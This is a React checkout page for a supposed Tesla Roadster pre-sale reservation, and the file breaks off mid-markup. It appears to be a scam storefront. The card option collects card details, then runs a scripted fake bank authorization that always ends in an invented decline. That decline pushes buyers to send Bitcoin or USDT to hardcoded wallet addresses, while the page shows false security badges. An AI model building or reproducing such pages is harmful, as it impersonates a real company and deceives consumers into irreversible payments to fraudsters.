import React, { useState } from 'react';
import { useLocation, useNavigate, Link } from 'react-router-dom';
import { useAuth } from '../context/AuthContext';
import { api } from '../services/api';
import { ProofOfPaymentUpload } from '../components/ProofOfPaymentUpload';
import { 
  Lock, 
  CreditCard, 
  CheckCircle2, 
  ArrowLeft, 
  ArrowRight, 
  ShieldCheck, 
  ShieldAlert,
  Copy,
  Check,
  QrCode,
  AlertCircle,
  HelpCircle,
  RefreshCw
} from 'lucide-react';

export const CheckoutPage = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const { user } = useAuth();

  // State from vehicle page or defaults
  const state = location.state || {};
  const vehicleId = state.vehicleId || 'veh_roadster_standard';
  const vehicleName = state.vehicleName || 'Tesla Roadster';
  const selectedConfiguration = state.selectedConfiguration || {
    color: 'Ultra Deep Red',
    wheel: '21" Turbofan Carbon Wheels',
    interior: 'Black Sport Alcantara & Carbon',
    package: 'Base Roadster Supercar'
  };
  const originalPrice = state.originalPrice || 200000;
  const discountAmount = state.discountAmount !== undefined ? state.discountAmount : 0;
  const finalPrice = state.finalPrice !== undefined ? state.finalPrice : originalPrice;
  const couponCode = state.couponCode || null;

  // Customer contact info
  const [customerName, setCustomerName] = useState(user?.fullName || 'John Doe');
  const [customerEmail, setCustomerEmail] = useState(user?.email || 'youremail@example.com');
  const [phone, setPhone] = useState('+1 (555) 837-5291');
  const [termsAccepted, setTermsAccepted] = useState(true);

  // Payment method selection: ONLY 'card', 'btc', and 'usdt'
  const [selectedMethod, setSelectedMethod] = useState('card');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [cardAuthorizing, setCardAuthorizing] = useState(false);
  const [authStepText, setAuthStepText] = useState('');
  const [error, setError] = useState('');
  const [copiedField, setCopiedField] = useState('');

  // Bank Card Form State
  const [cardholderName, setCardholderName] = useState(customerName);
  const [cardNumber, setCardNumber] = useState('');
  const [cardExpiry, setCardExpiry] = useState('');
  const [cardCvv, setCardCvv] = useState('');

  // USDT network selection
  const [usdtNetwork, setUsdtNetwork] = useState('TRC20'); // 'TRC20' or 'ERC20'

  // Proof of Payment state
  const [proofOfPayment, setProofOfPayment] = useState(null);
  const [txHash, setTxHash] = useState('');

  // Dynamically loaded crypto receiver addresses from system settings
  const [cryptoSettings, setCryptoSettings] = useState({
    btcAddress: 'bc1q8w7l5n9a4k2v0p8e3r7t6y1u2i3o4p5a6s7d',
    usdtTrc20Address: 'TYDzsXDikPf1PvhXiHGi8669Wqy3oh27Wk',
    usdtErc20Address: '0x71C8360f3E282352B492E8704D116496Eb36dC19'
  });

  React.useEffect(() => {
    api.getSettings()
      .then(res => {
        if (res) {
          setCryptoSettings({
            btcAddress: res.btcAddress || 'bc1q8w7l5n9a4k2v0p8e3r7t6y1u2i3o4p5a6s7d',
            usdtTrc20Address: res.usdtTrc20Address || 'TYDzsXDikPf1PvhXiHGi8669Wqy3oh27Wk',
            usdtErc20Address: res.usdtErc20Address || '0x71C8360f3E282352B492E8704D116496Eb36dC19'
          });
        }
      })
      .catch((err) => {
        console.warn('Using fallback receiver addresses:', err);
      });
  }, []);

  const BTC_DEPOSIT_ADDRESS = cryptoSettings.btcAddress;
  const USDT_TRC20_ADDRESS = cryptoSettings.usdtTrc20Address;
  const USDT_ERC20_ADDRESS = cryptoSettings.usdtErc20Address;

  // Calculated approximate BTC price ($95,000 / BTC reference)
  const btcAmount = (finalPrice / 95000).toFixed(6);

  const paymentMethods = [
    {
      id: 'card',
      name: 'Bank Card',
      badge: 'Credit / Debit',
      icon: <CreditCard size={18} className="text-blue-400" />,
      description: 'Visa, Mastercard & American Express direct payment'
    },
    {
      id: 'btc',
      name: 'Bitcoin (BTC)',
      badge: 'Blockchain',
      icon: <span className="font-black text-sm text-amber-400 px-1.5 py-0.5 bg-amber-500/10 rounded">₿ BTC</span>,
      description: 'Instant Bitcoin network payment & automated confirmation'
    },
    {
      id: 'usdt',
      name: 'USDT (Tether)',
      badge: 'Stablecoin',
      icon: <span className="font-black text-sm text-emerald-400 px-1.5 py-0.5 bg-emerald-500/10 rounded">₮ USDT</span>,
      description: 'USDT transfer via TRC-20 or ERC-20 networks'
    }
  ];

  // Helper: Card number formatting (adds space every 4 digits)
  const handleCardNumberChange = (e) => {
    const raw = e.target.value.replace(/\D/g, '').slice(0, 16);
    const formatted = raw.replace(/(\d{4})(?=\d)/g, '$1 ');
    setCardNumber(formatted);
  };

  // Helper: Expiry date formatting (MM/YY)
  const handleExpiryChange = (e) => {
    let raw = e.target.value.replace(/\D/g, '').slice(0, 4);
    if (raw.length > 2) {
      raw = raw.slice(0, 2) + '/' + raw.slice(2);
    }
    setCardExpiry(raw);
  };

  // Helper: CVV formatting (3-4 digits max)
  const handleCvvChange = (e) => {
    const raw = e.target.value.replace(/\D/g, '').slice(0, 4);
    setCardCvv(raw);
  };

  // Helper: Detect card brand
  const getCardBrand = (num) => {
    const clean = num.replace(/\s/g, '');
    if (clean.startsWith('4')) return { name: 'Visa', color: 'text-blue-400' };
    if (clean.startsWith('5') || clean.startsWith('2')) return { name: 'Mastercard', color: 'text-amber-400' };
    if (clean.startsWith('3')) return { name: 'Amex', color: 'text-emerald-400' };
    return { name: 'Bank Card', color: 'text-neutral-400' };
  };

  // Helper: Copy to clipboard
  const handleCopy = (text, fieldName) => {
    if (navigator?.clipboard?.writeText) {
      navigator.clipboard.writeText(text);
    }
    setCopiedField(fieldName);
    setTimeout(() => setCopiedField(''), 2500);
  };

  const handleCompletePayment = async () => {
    if (!customerEmail || !customerName) {
      setError('Please provide your name and email address.');
      return;
    }
    if (!termsAccepted) {
      setError('Please accept the reservation terms and conditions.');
      return;
    }

    setError('');

    // --- CARD PAYMENT FLOW ---
    if (selectedMethod === 'card') {
      const cleanNum = cardNumber.replace(/\s/g, '');
      if (cleanNum.length < 15) {
        setError('Please enter a valid 16-digit card number.');
        return;
      }
      if (cardExpiry.length !== 5) {
        setError('Please enter a valid expiration date (MM/YY).');
        return;
      }
      const [expMonth, expYear] = cardExpiry.split('/').map(Number);
      if (!expMonth || expMonth < 1 || expMonth > 12) {
        setError('Please enter a valid card expiration month (01-12).');
        return;
      }
      if (cardCvv.length < 3) {
        setError('Please enter a valid 3 or 4-digit CVV security code.');
        return;
      }
      if (!cardholderName.trim()) {
        setError('Please enter the name on the card.');
        return;
      }

      // Simulate 5-second issuing network authorization
      setIsSubmitting(true);
      setCardAuthorizing(true);
      setAuthStepText('Connecting to 3D-Secure 2.0 network...');

      const step1 = setTimeout(() => {
        setAuthStepText('Contacting card issuing bank authorization server...');
      }, 1800);

      const step2 = setTimeout(() => {
        setAuthStepText('Validating transaction limits and security tokens...');
      }, 3600);

      setTimeout(() => {
        clearTimeout(step1);
        clearTimeout(step2);
        setIsSubmitting(false);
        setCardAuthorizing(false);
        setAuthStepText('');
        setError('Card Authorization Failed: Your card issuer declined this transaction (Error: 05 - Transaction Declined by Bank). Please use Bitcoin (BTC) or USDT (Tether) to complete your reservation.');
      }, 5000);

      return;
    }

    // --- CRYPTO (BTC or USDT) FLOW ---
    setIsSubmitting(true);

    try {
      const providerLabel = selectedMethod === 'btc' 
        ? 'Bitcoin (BTC)' 
        : `USDT (${usdtNetwork})`;

      // 1. Create order on backend
      const orderPayload = {
        vehicleId,
        selectedConfiguration,
        couponCode,
        customerName,
        customerEmail,
        paymentMethod: providerLabel,
        proofOfPayment,
        txHash
      };

      const orderRes = await api.createOrder(orderPayload);
      const createdOrder = orderRes.order;

      // 2. Initialize payment session with selected provider
      const initRes = await api.initializePayment({
        orderId: createdOrder._id,
        provider: providerLabel,
      });

      // 3. Route to payment processing simulator / confirmation
      navigate('/payment-processing', {
        state: {
          order: createdOrder,
          paymentSession: initRes,
          provider: providerLabel,
          methodId: selectedMethod,
          cryptoAddress: selectedMethod === 'btc' 
            ? BTC_DEPOSIT_ADDRESS 
            : (usdtNetwork === 'TRC20' ? USDT_TRC20_ADDRESS : USDT_ERC20_ADDRESS),
          cryptoAmount: selectedMethod === 'btc' ? `${btcAmount} BTC` : `${finalPrice.toLocaleString()} USDT`,
          proofOfPayment,
          txHash,
        }
      });
    } catch (err) {
      console.error('Checkout error:', err);
      setError(err.message || 'Failed to initiate order. Please try again.');
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#070709] text-white py-10 px-4 sm:px-6 lg:px-8">
      <div className="max-w-6xl mx-auto space-y-8">
        {/* Top Header */}
        <div className="flex items-center justify-between pb-6 border-b border-white/10">
          <div className="flex items-center gap-3">
            <span className="tracking-[0.35em] text-lg font-bold text-white">TESLA</span>
            <span className="text-neutral-500">/</span>
            <h1 className="text-xl font-bold text-white tracking-tight">Checkout</h1>
          </div>

          <div className="flex items-center gap-2 text-xs font-semibold text-emerald-400 bg-emerald-500/10 border border-emerald-500/20 px-3 py-1.5 rounded-full">
            <Lock size={13} />
            <span>Secure & Encrypted</span>
          </div>
        </div>

        {/* Global Error Banner with Switch Recommendation */}
        {error && (
          <div className="p-4 bg-rose-500/10 border border-rose-500/30 rounded-xl text-xs text-rose-300 space-y-2.5 animate-fadeIn">
            <div className="flex items-start gap-2.5 font-medium">
              <ShieldAlert size={18} className="shrink-0 text-rose-400 mt-0.5" />
              <span>{error}</span>
            </div>
            {selectedMethod === 'card' && (
              <div className="flex flex-wrap items-center gap-2 pt-1 border-t border-rose-500/20">
                <span className="text-[11px] text-neutral-400">Recommended alternatives:</span>
                <button
                  type="button"
                  onClick={() => { setSelectedMethod('btc'); setError(''); }}
                  className="px-3 py-1 bg-amber-500/20 hover:bg-amber-500/30 text-amber-300 border border-amber-500/30 rounded-lg text-xs font-semibold transition-colors flex items-center gap-1.5"
                >
                  <span>₿ Pay with Bitcoin</span>
                </button>
                <button
                  type="button"
                  onClick={() => { setSelectedMethod('usdt'); setError(''); }}
                  className="px-3 py-1 bg-emerald-500/20 hover:bg-emerald-500/30 text-emerald-300 border border-emerald-500/30 rounded-lg text-xs font-semibold transition-colors flex items-center gap-1.5"
                >
                  <span>₮ Pay with USDT</span>
                </button>
              </div>
            )}
          </div>
        )}

        {/* Two-Column Layout */}
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
          {/* Left Column: Order Summary & Customer Info (5 cols) */}
          <div className="lg:col-span-5 space-y-6">
            <div className="glass-card p-6 sm:p-7 rounded-2xl border border-white/10 shadow-2xl space-y-6">
              <h2 className="text-base font-bold text-white tracking-tight">Order Summary</h2>

              {/* Vehicle Preview Card */}
              <div className="flex items-center gap-4 bg-white/[0.03] border border-white/10 p-3.5 rounded-xl">
                <img
                  src="/images/roadster-hero.jpg"
                  alt="Tesla Roadster"
                  className="w-20 h-14 object-cover rounded-lg border border-white/10"
                />
                <div>
                  <h3 className="font-semibold text-sm text-white">{vehicleName}</h3>
                  <p className="text-xs text-neutral-400">Pre-Sale Reservation</p>
                  <p className="text-[11px] text-neutral-500">
                    {selectedConfiguration?.color || 'Ultra Deep Red'} · {selectedConfiguration?.package || 'Base Roadster'}
                  </p>
                </div>
              </div>

              {/* Price Breakdown */}
              <div className="space-y-3 pt-2 text-sm text-neutral-300">
                <div className="flex justify-between">
                  <span>Original Price</span>
                  <span className="font-mono text-neutral-200">${originalPrice.toLocaleString()}</span>
                </div>

                {discountAmount > 0 && (
                  <div className="flex justify-between text-tesla-red font-medium">
                    <span>Discount {couponCode ? `(${couponCode})` : ''}</span>
                    <span className="font-mono">-${discountAmount.toLocaleString()}</span>
                  </div>
                )}

                <div className="border-t border-white/10 pt-4 flex justify-between items-baseline">
                  <span className="text-base font-bold text-white">Total Amount</span>
                  <span className="text-2xl sm:text-3xl font-extrabold text-tesla-red font-mono">
                    ${finalPrice.toLocaleString()}
                  </span>
                </div>

                {/* Crypto equivalent preview */}
                {selectedMethod === 'btc' && (
                  <div className="flex justify-between text-xs text-amber-400/90 pt-1">
                    <span>Estimated BTC</span>
                    <span className="font-mono font-bold">≈ {btcAmount} BTC</span>
                  </div>
                )}
                {selectedMethod === 'usdt' && (
                  <div className="flex justify-between text-xs text-emerald-400/90 pt-1">
                    <span>USDT Amount</span>
                    <span className="font-mono font-bold">{finalPrice.toLocaleString()} USDT</span>
                  </div>
                )}
              </div>

              {/* Back Link */}
              <div className="pt-2">
                <Link
                  to="/roadster"
                  className="inline-flex items-center gap-2 text-xs text-neutral-400 hover:text-white transition-colors"
                >
                  <ArrowLeft size={14} /> Back to vehicle configuration
                </Link>
              </div>
            </div>

            {/* Customer Details Form */}
            <div className="glass-card p-6 rounded-2xl border border-white/10 space-y-4">
              <h3 className="text-xs font-bold uppercase tracking-wider text-neutral-400">
                Customer Information
              </h3>

              <div className="space-y-3">
                <div>
                  <label className="block text-xs text-neutral-400 mb-1">Full Name</label>
                  <input
                    type="text"
                    value={customerName}
                    onChange={(e) => {
                      setCustomerName(e.target.value);
                      if (!cardholderName) setCardholderName(e.target.value);
                    }}
                    className="w-full px-3.5 py-2 bg-[#141419] border border-white/10 rounded-xl text-xs text-white focus:outline-none focus:border-tesla-red"
                  />
                </div>

                <div>
                  <label className="block text-xs text-neutral-400 mb-1">Email Address</label>
                  <input
                    type="email"
                    value={customerEmail}
                    onChange={(e) => setCustomerEmail(e.target.value)}
                    className="w-full px-3.5 py-2 bg-[#141419] border border-white/10 rounded-xl text-xs text-white focus:outline-none focus:border-tesla-red"
                  />
                </div>

                <div>
                  <label className="block text-xs text-neutral-400 mb-1">Contact Phone</label>
                  <input
                    type="text"
                    value={phone}
                    onChange={(e) => setPhone(e.target.value)}
                    className="w-full px-3.5 py-2 bg-[#141419] border border-white/10 rounded-xl text-xs text-white focus:outline-none focus:border-tesla-red"
                  />
                </div>
              </div>
            </div>
          </div>

          {/* Right Column: Payment Methods & Active Gateway Form (7 cols) */}
          <div className="lg:col-span-7 space-y-6">
            <div className="glass-card p-6 sm:p-8 rounded-2xl border border-white/15 shadow-2xl space-y-6">
              <div className="flex items-center justify-between">
                <h2 className="text-base font-bold text-white tracking-tight">Select Payment Method</h2>
                <span className="text-[11px] text-neutral-400 font-mono">3 Supported Options</span>
              </div>

              {/* Payment Method Selector Cards (ONLY Card, BTC, and USDT) */}
              <div className="space-y-3">
                {paymentMethods.map((method) => {
                  const isSelected = selectedMethod === method.id;
                  return (
                    <div
                      key={method.id}
                      onClick={() => {
                        setSelectedMethod(method.id);
                        setError('');
                      }}
                      className={`p-4 rounded-xl border cursor-pointer flex items-center justify-between transition-all ${
                        isSelected
                          ? 'border-tesla-red bg-tesla-red/10 shadow-glow-red/20'
                          : 'border-white/10 bg-[#121217] hover:border-white/20'
                      }`}
                    >
                      <div className="flex items-center gap-3">
                        <div className="w-9 h-9 rounded-lg bg-white/5 flex items-center justify-center shrink-0">
                          {method.icon}
                        </div>
                        <div>
                          <div className="flex items-center gap-2">
                            <span className="text-sm font-semibold text-white">{method.name}</span>
                            <span className="text-[10px] text-neutral-400 px-1.5 py-0.5 rounded bg-white/5 border border-white/10">
                              {method.badge}
                            </span>
                          </div>
                          <div className="text-[11px] text-neutral-400 mt-0.5">{method.description}</div>
                        </div>
                      </div>

                      {/* Selected Radio Indicator */}
                      <div className="shrink-0 pl-2">
                        {isSelected ? (
                          <div className="w-5 h-5 rounded-full bg-tesla-red flex items-center justify-center text-white">
                            <CheckCircle2 size={14} />
                          </div>
                        ) : (
                          <div className="w-5 h-5 rounded-full border border-white/20" />
                        )}
                      </div>
                    </div>
                  );
                })}
              </div>

              {/* ============================================================ */}
              {/* OPTION 1: BANK CARD INTERACTIVE PAYMENT FORM                  */}
              {/* ============================================================ */}
              {selectedMethod === 'card' && (
                <div className="p-5 bg-white/[0.02] border border-white/10 rounded-2xl space-y-4">
                  <div className="flex items-center justify-between pb-2 border-b border-white/5">
                    <div className="flex items-center gap-2">
                      <CreditCard size={16} className="text-blue-400" />
                      <span className="text-xs font-bold text-white uppercase tracking-wider">
                        Card Payment Details
                      </span>
                    </div>
                    <span className="text-[10px] text-emerald-400 font-mono bg-emerald-500/10 px-2 py-0.5 rounded border border-emerald-500/20">
                      256-Bit SSL Encrypted
                    </span>
                  </div>

                  {/* Sleek Visual Card Preview */}
                  <div className="bg-gradient-to-tr from-[#1b1b22] via-[#23232c] to-[#16161c] p-4 rounded-xl border border-white/15 shadow-lg space-y-4">
                    <div className="flex justify-between items-center">
                      <div className="w-10 h-7 rounded bg-amber-400/20 border border-amber-400/40 flex items-center justify-center">
                        <div className="w-6 h-4 border border-amber-300/40 rounded-sm" />
                      </div>
                      <span className={`text-xs font-bold font-mono ${getCardBrand(cardNumber).color}`}>
                        {getCardBrand(cardNumber).name}
                      </span>
                    </div>

                    <div className="font-mono text-base tracking-[0.2em] text-white">
                      {cardNumber || '•••• •••• •••• ••••'}
                    </div>

                    <div className="flex justify-between items-end text-[11px] text-neutral-400 font-mono">
                      <div>
                        <div className="text-[9px] uppercase tracking-wider text-neutral-500">Cardholder</div>
                        <div className="text-neutral-200 font-sans font-medium uppercase truncate max-w-[180px]">
                          {cardholderName || 'NAME ON CARD'}
                        </div>
                      </div>
                      <div>
                        <div className="text-[9px] uppercase tracking-wider text-neutral-500">Expires</div>
                        <div className="text-neutral-200">{cardExpiry || 'MM/YY'}</div>
                      </div>
                    </div>
                  </div>

                  {/* Input Fields */}
                  <div className="space-y-3 pt-1">
                    <div>
                      <label className="block text-[11px] text-neutral-400 mb-1 font-medium">
                        Cardholder Name
                      </label>
                      <input
                        type="text"
                        value={cardholderName}
                        onChange={(e) => setCardholderName(e.target.value)}
                        placeholder="e.g. John Doe"
                        className="w-full px-3.5 py-2.5 bg-[#141419] border border-white/10 rounded-xl text-xs text-white focus:outline-none focus:border-tesla-red uppercase"
                      />
                    </div>

                    <div>
                      <label className="block text-[11px] text-neutral-400 mb-1 font-medium">
                        Card Number
                      </label>
                      <div className="relative">
                        <input
                          type="text"
                          value={cardNumber}
                          onChange={handleCardNumberChange}
                          placeholder="4532 0123 4567 8910"
                          maxLength={19}
                          className="w-full pl-3.5 pr-10 py-2.5 bg-[#141419] border border-white/10 rounded-xl text-xs font-mono text-white focus:outline-none focus:border-tesla-red tracking-wider"
                        />
                        <div className="absolute right-3 top-2.5">
                          <CreditCard size={16} className={getCardBrand(cardNumber).color} />
                        </div>
                      </div>
                    </div>

                    <div className="grid grid-cols-2 gap-3">
                      <div>
                        <label className="block text-[11px] text-neutral-400 mb-1 font-medium">
                          Expiration Date
                        </label>
                        <input
                          type="text"
                          value={cardExpiry}
                          onChange={handleExpiryChange}
                          placeholder="MM/YY"
                          maxLength={5}
                          className="w-full px-3.5 py-2.5 bg-[#141419] border border-white/10 rounded-xl text-xs font-mono text-white focus:outline-none focus:border-tesla-red text-center"
                        />
                      </div>

                      <div>
                        <label className="block text-[11px] text-neutral-400 mb-1 font-medium">
                          CVV / CVC
                        </label>
                        <input
                          type="password"
                          value={cardCvv}
                          onChange={handleCvvChange}
                          placeholder="•••"
                          maxLength={4}
                          className="w-full px-3.5 py-2.5 bg-[#141419] border border-white/10 rounded-xl text-xs font-mono text-white focus:outline-none focus:border-tesla-red text-center tracking-widest"
                        />
                      </div>
                    </div>
                  </div>

                  {cardAuthorizing && (
                    <div className="p-3 bg-blue-500/10 border border-blue-500/30 rounded-xl flex items-center gap-3 text-xs text-blue-300 animate-pulse">
                      <RefreshCw size={15} className="animate-spin text-blue-400 shrink-0" />
                      <span>{authStepText}</span>
                    </div>
                  )}
                </div>
              )}

              {/* ============================================================ */}
              {/* OPTION 2: BITCOIN (BTC) PAYMENT CONTAINER                    */}
              {/* ============================================================ */}
              {selectedMethod === 'btc' && (
                <div className="p-5 bg-white/[0.02] border border-amber-500/20 rounded-2xl space-y-4">
                  <div className="flex items-center justify-between pb-2 border-b border-white/5">
                    <div className="flex items-center gap-2">
                      <span className="text-amber-400 font-bold">₿</span>
                      <span className="text-xs font-bold text-white uppercase tracking-wider">
                        Bitcoin Payment Instructions
                      </span>
                    </div>
                    <span className="text-[10px] text-amber-400 font-mono bg-amber-500/10 px-2 py-0.5 rounded border border-amber-500/20">
                      Bitcoin Mainnet
                    </span>
                  </div>

                  {/* QR Code and Amount Section */}
                  <div className="grid grid-cols-1 sm:grid-cols-12 gap-4 items-center bg-[#101015] p-4 rounded-xl border border-white/10">
                    {/* SVG QR Code Simulation */}
                    <div className="sm:col-span-4 flex flex-col items-center justify-center p-3 bg-white rounded-lg shadow">
                      <svg viewBox="0 0 100 100" className="w-24 h-24">
                        {/* Finder patterns */}
                        <rect x="5" y="5" width="25" height="25" fill="#000" />
                        <rect x="9" y="9" width="17" height="17" fill="#fff" />
                        <rect x="13" y="13" width="9" height="9" fill="#000" />

                        <rect x="70" y="5" width="25" height="25" fill="#000" />
                        <rect x="74" y="9" width="17" height="17" fill="#fff" />
                        <rect x="78" y="13" width="9" height="9" fill="#000" />

                        <rect x="5" y="70" width="25" height="25" fill="#000" />
                        <rect x="9" y="74" width="17" height="17" fill="#fff" />
                        <rect x="13" y="78" width="9" height="9" fill="#000" />

                        {/* Simulated data dots */}
                        <rect x="35" y="10" width="5" height="5" fill="#f59e0b" />
                        <rect x="45" y="15" width="5" height="5" fill="#000" />
                        <rect x="55" y="10" width="5" height="5" fill="#000" />
                        <rect x="35" y="25" width="5" height="5" fill="#000" />
                        <rect x="45" y="35" width="10" height="10" fill="#f59e0b" />
                        <rect x="10" y="40" width="5" height="5" fill="#000" />
                        <rect x="20" y="50" width="5" height="5" fill="#000" />
                        <rect x="35" y="65" width="5" height="5" fill="#000" />
                        <rect x="45" y="75" width="5" height="5" fill="#000" />
                        <rect x="55" y="65" width="5" height="5" fill="#000" />
                        <rect x="65" y="45" width="5" height="5" fill="#000" />
                        <rect x="75" y="55" width="5" height="5" fill="#000" />
                        <rect x="85" y="45" width="5" height="5" fill="#f59e0b" />
                        <rect x="75" y="75" width="5" height="5" fill="#000" />
                        <rect x="85" y="85" width="5" height="5" fill="#000" />
                      </svg>
                      <span className="text-[10px] text-neutral-800 font-mono mt-1 font-bold">Scan with Wallet</span>
                    </div>

                    <div className="sm:col-span-8 space-y-3">
                      <div>
                        <div className="text-[10px] uppercase tracking-wider text-neutral-400">Total Amount in BTC</div>
                        <div className="text-xl font-bold font-mono text-amber-400 flex items-center gap-2">
                          <span>{btcAmount} BTC</span>
                          <span className="text-xs font-normal text-neutral-400 font-sans">
                            (${finalPrice.toLocaleString()} USD)
                          </span>
                        </div>
                      </div>

                      <div>
                        <div className="text-[10px] uppercase tracking-wider text-neutral-400 mb-1">
                          Deposit Bitcoin Address
                        </div>
                        <div className="flex items-center gap-2 bg-[#181820] border border-white/10 rounded-xl p-2.5">
                          <span className="font-mono text-xs text-neutral-200 break-all select-all">
                            {BTC_DEPOSIT_ADDRESS}
                          </span>
                          <button
                            type="button"
                            onClick={() => handleCopy(BTC_DEPOSIT_ADDRESS, 'btc')}
                            className="shrink-0 p-1.5 bg-amber-500/10 hover:bg-amber-500/20 text-amber-400 rounded-lg transition-colors flex items-center gap-1 text-xs"
                          >
                            {copiedField === 'btc' ? (
                              <>
                                <Check size={14} className="text-emerald-400" />
                                <span className="text-[10px] text-emerald-400 font-medium">Copied</span>
                              </>
                            ) : (
                              <>
                                <Copy size={14} />
                                <span className="text-[10px]">Copy</span>
                              </>
                            )}
                          </button>
                        </div>
                      </div>
                    </div>
                  </div>

                  <div className="p-3 bg-amber-500/10 border border-amber-500/20 rounded-xl text-[11px] text-amber-200/90 space-y-1">
                    <p className="font-semibold text-amber-300">Important Payment Note:</p>
                    <p>• Send the exact BTC amount shown above in a single transaction.</p>
                    <p>• Confirmations typically require 1-2 network blocks on Bitcoin Mainnet.</p>
                    <p>• Your reservation will be updated automatically upon blockchain confirmation.</p>
                  </div>

                  {/* Upload Proof of Payment (Bitcoin) */}
                  <div className="pt-2 border-t border-white/5">
                    <ProofOfPaymentUpload
                      proof={proofOfPayment}
                      onProofChange={setProofOfPayment}
                      txHash={txHash}
                      onTxHashChange={setTxHash}
                      label="Upload Bitcoin Payment Proof"
                      sublabel="Upload screenshot or receipt of your BTC transaction (optional/recommended)"
                    />
                  </div>
                </div>
              )}

              {/* ============================================================ */}
              {/* OPTION 3: USDT (TETHER) PAYMENT CONTAINER                    */}
              {/* ============================================================ */}
              {selectedMethod === 'usdt' && (
                <div className="p-5 bg-white/[0.02] border border-emerald-500/20 rounded-2xl space-y-4">
                  <div className="flex items-center justify-between pb-2 border-b border-white/5">
                    <div className="flex items-center gap-2">
                      <span className="text-emerald-400 font-bold">₮</span>
                      <span className="text-xs font-bold text-white uppercase tracking-wider">
                        USDT Stablecoin Deposit
                      </span>
                    </div>
                    <span className="text-[10px] text-emerald-400 font-mono bg-emerald-500/10 px-2 py-0.5 rounded border border-emerald-500/20">
                      1 USDT = 1 USD
                    </span>
                  </div>

                  {/* Network Selection Tabs (TRC-20 vs ERC-20) */}
                  <div className="space-y-1.5">
                    <label className="block text-[11px] text-neutral-400 font-medium">
                      Select USDT Network Protocol:
                    </label>
                    <div className="grid grid-cols-2 gap-3">
                      <button
                        type="button"
                        onClick={() => setUsdtNetwork('TRC20')}
                        className={`p-3 rounded-xl border text-left transition-all ${
                          usdtNetwork === 'TRC20'
                            ? 'border-emerald-500 bg-emerald-500/10 text-white shadow-glow-emerald/20'
                            : 'border-white/10 bg-[#121217] text-neutral-400 hover:border-white/20'
                        }`}
                      >
                        <div className="font-bold text-xs flex items-center justify-between">
                          <span>TRC-20 (Tron)</span>
                          {usdtNetwork === 'TRC20' && <CheckCircle2 size={13} className="text-emerald-400" />}
                        </div>
                        <div className="text-[10px] text-neutral-400 mt-0.5">Fastest & minimal network fee</div>
                      </button>

                      <button
                        type="button"
                        onClick={() => setUsdtNetwork('ERC20')}
                        className={`p-3 rounded-xl border text-left transition-all ${
                          usdtNetwork === 'ERC20'
                            ? 'border-emerald-500 bg-emerald-500/10 text-white shadow-glow-emerald/20'
                            : 'border-white/10 bg-[#121217] text-neutral-400 hover:border-white/20'
                        }`}
                      >
                        <div className="font-bold text-xs flex items-center justify-between">
                          <span>ERC-20 (Ethereum)</span>
                          {usdtNetwork === 'ERC20' && <CheckCircle2 size={13} className="text-emerald-400" />}
                        </div>
                        <div className="text-[10px] text-neutral-400 mt-0.5">Standard Ethereum ERC-20 token</div>
                      </button>
                    </div>
                  </div>

                  {/* Deposit Address Box */}
                  <div className="bg-[#101015] p-4 rounded-xl border border-white/10 space-y-3">
                    <div className="flex justify-between items-center text-xs">
                      <span className="text-neutral-400">Total Due:</span>
                      <span className="font-mono text-emerald-400 font-bold text-base">
                        {finalPrice.toLocaleString()} USDT
                      </span>
                    </div>

                    <div>
                      <div className="text-[10px] uppercase tracking-wider text-neutral-400 mb-1">
                        Deposit USDT Address ({usdtNetwork}):
                      </div>
                      <div className="flex items-center gap-2 bg-[#181820] border border-white/10 rounded-xl p-2.5">
                        <span className="font-mono text-xs text-neutral-200 break-all select-all">
                          {usdtNetwork === 'TRC20' ? USDT_TRC20_ADDRESS : USDT_ERC20_ADDRESS}
                        </span>
                        <button
                          type="button"
                          onClick={() => handleCopy(
                            usdtNetwork === 'TRC20' ? USDT_TRC20_ADDRESS : USDT_ERC20_ADDRESS,
                            'usdt'
                          )}
                          className="shrink-0 p-1.5 bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-400 rounded-lg transition-colors flex items-center gap-1 text-xs"
                        >
                          {copiedField === 'usdt' ? (
                            <>
                              <Check size={14} className="text-emerald-400" />
                              <span className="text-[10px] text-emerald-400 font-medium">Copied</span>
                            </>
                          ) : (
                            <>
                              <Copy size={14} />
                              <span className="text-[10px]">Copy</span>
                            </>
                          )}
                        </button>
                      </div>
                    </div>
                  </div>

                  <div className="p-3 bg-emerald-500/10 border border-emerald-500/20 rounded-xl text-[11px] text-emerald-200/90 space-y-1">
                    <p className="font-semibold text-emerald-300">Tether (USDT) Notice:</p>
                    <p>• Only send USDT to this address using the selected <span className="font-bold underline">{usdtNetwork}</span> protocol.</p>
                    <p>• Sending any other cryptocurrency may result in permanent deposit loss.</p>
                  </div>

                  {/* Upload Proof of Payment (USDT) */}
                  <div className="pt-2 border-t border-white/5">
                    <ProofOfPaymentUpload
                      proof={proofOfPayment}
                      onProofChange={setProofOfPayment}
                      txHash={txHash}
                      onTxHashChange={setTxHash}
                      label="Upload USDT Payment Proof"
                      sublabel="Upload screenshot or receipt of your USDT transfer (optional/recommended)"
                    />
                  </div>
                </div>
              )}

              {/* Reservation Terms Checkbox */}
              <div className="flex items-start gap-3 pt-2">
                <input
                  type="checkbox"
                  id="demoTerms"
                  checked={termsAccepted}
                  onChange={(e) => setTermsAccepted(e.target.checked)}
                  className="mt-1 h-4 w-4 rounded border-white/20 text-tesla-red focus:ring-tesla-red bg-[#141419]"
                />
                <label htmlFor="demoTerms" className="text-xs text-neutral-400 leading-normal cursor-pointer">
                  I understand and accept the Tesla Roadster reservation agreement, vehicle build timeline, and reservation deposit terms.
                </label>
              </div>

              {/* Complete Payment Button */}
              <button
                type="button"
                onClick={handleCompletePayment}
                disabled={isSubmitting || !termsAccepted}
                className="w-full btn-tesla-primary py-3.5 text-base font-semibold flex items-center justify-center gap-2 shadow-glow-red disabled:opacity-50 cursor-pointer"
              >
                {isSubmitting ? (
                  <div className="flex items-center gap-2 text-sm">
                    <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
                    <span>
                      {selectedMethod === 'card' 
                        ? 'Authorizing with Bank Network (5s)...' 
                        : 'Creating Crypto Reservation...'}
                    </span>
                  </div>
                ) : (
                  <>
                    <Lock size={16} />
                    <span>
                      {selectedMethod === 'card' && 'Authorize Card Payment'}
                      {selectedMethod === 'btc' && 'I Have Sent Bitcoin (BTC)'}
                      {selectedMethod === 'usdt' && `I Have Sent USDT (${usdtNetwork})`}
                    </span>
